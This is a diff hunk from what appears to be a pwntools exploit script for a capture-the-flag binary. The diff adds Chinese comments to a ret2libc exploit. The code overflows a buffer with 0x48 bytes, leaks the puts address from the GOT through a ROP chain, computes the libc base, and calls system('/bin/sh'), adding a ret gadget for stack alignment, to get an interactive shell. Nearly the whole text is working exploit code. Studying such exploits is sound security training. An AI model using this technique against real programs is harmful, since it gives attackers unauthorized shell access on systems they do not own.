@@ -33,12 +33,12 @@ puts_got = elf.got['puts']
 payload = b'a'*0x48 + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(elf.sym['main'])
 sl(payload)
 ru(b'You said: ')
-ru('\x0a')
+ru('\x0a')#换行符
 puts_addr = uu64(r(6))
 print(hex(puts_addr))
 libc_base = puts_addr - libc.sym['puts']
 system_addr = libc_base + libc.sym['system']
 sh_addr = libc_base + next(libc.search(b'/bin/sh'))
-payload = b'a'*0x48 + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
+payload = b'a'*0x48 + p64(ret) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)#多一个p(ret)是因为system函数浮点特性，必须多一次pop rip指令
 sl(payload)
 itr()
